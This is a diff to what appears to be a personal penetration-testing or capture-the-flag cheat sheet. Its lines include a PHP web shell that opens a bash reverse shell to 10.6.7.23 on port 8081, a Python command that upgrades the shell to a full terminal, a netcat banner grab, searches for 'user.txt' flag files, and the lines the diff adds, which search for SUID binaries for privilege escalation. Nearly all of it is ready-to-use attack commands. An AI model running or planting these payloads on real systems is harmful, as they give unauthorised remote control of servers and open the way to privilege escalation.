@@ -29,15 +29,22 @@ Exotic Ports → Always banner grab (nc -nv <ip> <port>).
 3. 
 
 <!-- shell -->
-
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.7.23/8081 0>&1'");
 ?>
 
 
 <!-- upgrade shell --> 
-
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-
+<!-- Find in shell-->
 find / -name 'user.txt' 2>/dev/null
+
+<!-- Find on kali -->
+ps aux | grep openvpn
+sudo kill -9 <PID>
+
+<!-- SUID Binaries -->
+find / -perm /4000 2>/dev/null
+
+
